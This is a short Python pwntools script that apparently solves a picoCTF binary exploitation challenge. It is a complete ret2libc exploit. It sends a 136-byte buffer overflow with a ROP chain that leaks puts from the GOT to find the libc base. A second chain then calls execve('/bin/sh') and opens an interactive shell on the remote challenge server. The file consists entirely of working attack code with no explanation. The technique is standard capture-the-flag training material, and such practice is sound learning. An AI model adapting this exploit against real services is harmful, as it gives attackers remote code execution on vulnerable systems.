#!/usr/bin/env python3

from pwn import *
import pwnlib.util.packing as pack
exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mercury.picoctf.net", 37289)

    return r


def main():
    r = conn()
    input()
    pop_rdi = 0x0000000000400913
    payload = b'A'*136
    payload += p64(pop_rdi) + p64(exe.got['puts']) 
    payload += p64(exe.plt['puts'])
    payload += p64(exe.sym['main'])
    r.sendlineafter(b'sErVeR!\n', payload)
    r.recvline()
    libc_leak = u64(r.recv(6) + b'\0\0')
    libc.address = libc_leak - libc.sym['puts']
    info('Libc leak address: ' + hex(libc_leak))
    info('Libc base address: ' + hex(libc.address))
    info('Libc system address: ' + hex(libc.sym['system']))
    pause()
    pop_rsi = 0x0000000000400911
    payload = b'A'*136
    payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh\x00'))) 
    payload += p64(pop_rsi) + p64(0) + p64(0)
    payload +=  p64(libc.sym['execve'])
    r.sendlineafter(b'sErVeR!\n', payload)
    pause()
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
